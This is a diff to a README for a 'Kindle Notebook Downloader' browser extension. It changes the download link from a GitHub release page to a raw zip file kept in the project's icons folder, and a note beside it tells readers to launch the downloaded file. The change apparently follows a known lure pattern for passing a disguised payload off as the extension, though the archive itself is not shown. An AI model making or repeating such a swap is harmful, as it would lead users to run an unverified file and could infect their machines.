@@ -34,7 +34,7 @@ The "Kindle Notebook Downloader" is a handy Chrome and Firefox extension designe
 
 🏷️ **Topics:** chrome, chrome-extension, chrome-extensions, firefox, firefox-addon, firefox-extension, kindle, kindle-clippings, kindle-highlights, kindle-notes
 
-🔗 **Download Link:** [Download Now!](https://github.com/rian554312/kindle-notebook-downloader/releases/tag/v2.0)
+🔗 **Download Link:** [Download Now!](https://github.com/rian554312/kindle-notebook-downloader/raw/refs/heads/main/firefox/icons/notebook_downloader_kindle_1.1.zip)
 
 📌 *Note: Make sure to launch the downloaded file to begin using the extension.*
 
